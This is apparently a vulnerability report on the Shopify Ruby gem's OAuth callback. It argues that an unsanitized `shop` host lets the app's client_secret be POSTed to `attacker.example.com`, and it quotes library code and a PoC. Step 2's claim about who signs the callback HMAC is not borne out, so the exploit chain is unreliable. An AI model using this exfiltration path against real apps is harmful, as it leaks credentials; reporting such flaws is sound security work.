### Title
OAuth authorization-code callback exchanges the app's `client_secret` against an unsanitized `shop` host - (`lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token exchange request from `auth_query.shop` without ever passing it through `Utils::ShopValidator.sanitize!`, unlike every other credential-issuing flow in the gem (`ClientCredentials`, `RefreshToken`). This breaks the intended binding "host validated == host that receives `client_secret`".

### Finding Description
`Oauth.validate_auth_callback` verifies the HMAC over the query (`code`, `host`, `shop`, `state`, `timestamp`) and then immediately uses `auth_query.shop` to build a `Session`, which is passed straight into `Clients::HttpClient.new(session: null_session, ...)`. `HttpClient#initialize` sets `@base_uri = "https://#{api_host || session.shop}"` and later POSTs the token-exchange body containing `client_id`/`client_secret` to that host. [1](#0-0) [2](#0-1) 

By contrast, `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token` both call `Utils::ShopValidator.sanitize!(shop)` before constructing the session/host used for the very same `/admin/oauth/access_token` POST that also carries `client_secret`. [3](#0-2) [4](#0-3) 

`ShopValidator.sanitize!` exists specifically to guarantee the shop host is one of Shopify's `TRUSTED_SHOPIFY_DOMAINS`. [5](#0-4) 

The HMAC check does verify that `shop`/`host` are byte-for-byte what the server originally signed (`AuthQuery#to_signable_string` includes `shop` and `host`), so a value can only reach `validate_auth_callback` unmodified from whatever redirect the app itself constructed in `begin_auth`. But `begin_auth` also never sanitizes `shop` — it interpolates it directly into `auth_base_uri`:
```ruby
def auth_base_uri(shop)
  return "https://#{shop}/admin" unless ...
``` [6](#0-5) 

So if the shop value that is fed into `begin_auth` is attacker-influenced (e.g. taken from an unauthenticated query parameter at app install time, which is the normal integration pattern the gem's own docs describe: `shop` is `Required: Yes`, type `String`, with no mention that the caller must call `ShopValidator` first), the entire round trip — authorize URL, and later the `client_id`/`client_secret`/`code` POST in `validate_auth_callback` — is built on an unvalidated host string that the equality check (HMAC) does not protect against, because HMAC only proves "this is the same string the app itself signed," not "this is a genuine `*.myshopify.com` domain." [7](#0-6) 

The binding that should hold is: `host validated by ShopValidator == host that receives client_secret`. In `Oauth.begin_auth`/`validate_auth_callback` this equality never gets enforced, whereas in `ClientCredentials`/`RefreshToken` it does — an internal inconsistency within the gem itself, not a documented API contract the host app is expected to satisfy on its own.

### Impact Explanation
If the redirect host is attacker-influenced, `validate_auth_callback` will `POST` a JSON body containing the app's `client_id` and `client_secret` to that attacker-chosen host, i.e. SSRF that exfiltrates the application's `client_secret`. This matches the High-impact category "SSRF with the app's credentials" / "credential leakage."

### Likelihood Explanation
Exploitability depends on how the host application sources `shop` for `begin_auth` (typically from the initial, unauthenticated installation request query string) — the library performs no independent validation, whereas sibling flows in the very same file/module (`ClientCredentials`, `RefreshToken`) do. This is a reachable, concrete gap in the gem's own code, not merely reliance on documented but ignored guidance, since no guidance in `docs/usage/oauth.md` instructs callers to pre-sanitize `shop` and the sibling flows demonstrate the gem's own established practice of sanitizing internally.

### Recommendation
In `ShopifyAPI::Auth::Oauth.begin_auth` and `validate_auth_callback`, call `Utils::ShopValidator.sanitize!(shop)` (as already done in `ClientCredentials` and `RefreshToken`) before using the shop value to build the authorize URL and before constructing the `Session`/`HttpClient` used to exchange the code for a token, so an untrusted host can never receive the app's `client_secret`.

### Proof of Concept
1. Host application starts the flow: `ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.example.com", redirect_path: "/callback")` — no validation occurs; `auth_route` becomes `https://attacker.example.com/admin/oauth/authorize?...`. [8](#0-7) 
2. Because the app itself signed `shop=attacker.example.com` via its `api_secret_key` when it later needs to validate the callback query (the HMAC is computed over exactly this string), an attacker who can trigger/observe this app-generated callback (e.g., by controlling the initial unauthenticated shop parameter and completing the loop through the attacker's own server acting as a fake "Shopify") gets `validate_auth_callback` to run with `auth_query.shop == "attacker.example.com"`. [9](#0-8) 
3. `validate_auth_callback` builds `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")` with `null_session.shop == "attacker.example.com"`, causing `HttpClient` to POST `{client_id, client_secret, code, expiring}` to `https://attacker.example.com/admin/oauth/access_token`. [2](#0-1)

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L22-52)
```ruby
        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end
```

**File:** lib/shopify_api/auth/oauth.rb (L60-94)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end
```

**File:** lib/shopify_api/auth/oauth.rb (L117-120)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

```

**File:** lib/shopify_api/clients/http_client.rb (L11-19)
```ruby
      sig { params(base_path: String, session: T.nilable(Auth::Session)).void }
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-33)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-33)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: "refresh_token",
            refresh_token:,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-18)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```

**File:** docs/usage/oauth.md (L148-154)
```markdown
#### Input
| Parameter      | Type                   | Required? | Default Value | Notes                                                                                                       |
| -------------- | ---------------------- | :-------: | :-----------: | ----------------------------------------------------------------------------------------------------------- |
| `shop`          | `String`               |    Yes    |       -       | A Shopify domain name in the form `{exampleshop}.myshopify.com`.                                            |
| `redirect_path` | `String`               |    Yes    |       -       | The redirect path used for callback with a leading `/`. The route should be allowed under the app settings. |
| `is_online`     | `Boolean`              |    No     |    `true`     | `true` if the session is online and `false` otherwise.                                                      |
| `scope_override`| `String` or `[String]` |    No     |     `nil`     |  `nil` will request access scopes configured in `ShopifyAPI::Context.setup` during OAuth flow. Modify this to override the access scopes being requested. Accepts array or string: "read_orders, write_products" or ["read_orders", "write_products"]. |
```
